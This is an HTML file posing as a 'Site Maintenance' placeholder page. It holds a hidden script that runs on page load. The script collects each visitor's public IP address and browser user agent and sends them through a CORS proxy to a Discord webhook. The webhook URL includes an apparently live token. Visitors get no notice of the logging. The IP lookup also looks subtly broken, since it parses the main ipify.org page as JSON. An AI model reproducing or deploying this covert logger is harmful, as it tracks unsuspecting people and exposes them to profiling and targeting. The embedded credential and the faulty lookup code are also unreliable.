<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Site Maintenance</title>
</head>
<body>
    <h1>Under Maintenance</h1>
    <p>This page is currently under construction. Please check back later.</p>

    <script>
        // 1. PASTE YOUR DISCORD WEBHOOK URL INSIDE THE SINGLE QUOTES BELOW
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1558892647089836093/E4Xk1AqveqMt5TMLkPz9SO9BDuBLveX97hgOzQqTh3S9IHukEPWZMDtaJZCLottUBzj7';

        async function logVisitor() {
            try {
                // 2. Fetch the public IP address (this will be your Proton VPN IP)
                const ipResponse = await fetch('https://ipify.org');
                const ipData = await ipResponse.json();
                const visitorIp = ipData.ip;

                // 3. Gather basic browser details
                const userAgent = navigator.userAgent;

                // 4. Prepare the payload structure for Discord
                const payload = {
                    content: `**New Visitor Logged**\n**IP:** ${visitorIp}\n**User Agent:** ${userAgent}`
                };

                // 5. Route the request through the CORS proxy to allow it to reach Discord
                const proxyUrl = 'https://corsproxy.io?' + encodeURIComponent(WEBHOOK_URL);

                await fetch(proxyUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                console.log("Log sent successfully!");

            } catch (error) {
                console.error('Error logging details:', error);
            }
        }

        // Run the script automatically when the page finishes loading
        window.onload = logVisitor;
    </script>
</body>
</html>
